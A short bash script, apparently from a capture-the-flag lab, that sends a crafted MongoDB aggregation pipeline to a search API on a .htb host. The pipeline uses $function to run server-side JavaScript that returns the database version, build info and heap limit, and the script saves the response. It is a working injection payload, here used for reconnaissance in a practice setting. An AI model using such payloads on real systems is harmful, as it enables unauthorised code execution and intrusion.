#!/usr/bin/env bash
set -o pipefail

source "$(dirname -- "${BASH_SOURCE[0]}")/common.sh"

base='http://aegis.korvia.htb:3000/api/v1/aegis-mds/search'
pipeline='[{"$limit":1},{"$project":{"_id":0,"info":{"$function":{"body":"function(){ return {version:version(),build:buildInfo(),heapMB:getJSHeapLimitMB()}; }","args":[],"lang":"js"}}}}]'
body="$odyssey_root/responses/mongodb-buildinfo.body"
headers="$odyssey_root/responses/mongodb-buildinfo.headers"

curl --connect-timeout 5 --max-time 15 -sS -G \
  -D "$headers" -o "$body" \
  --data-urlencode "pipeline=$pipeline" "$base"
awk 'NR==1{print "status=" $2}' "$headers"
jq . "$body" 2>/dev/null || sed -n '1,240p' "$body"
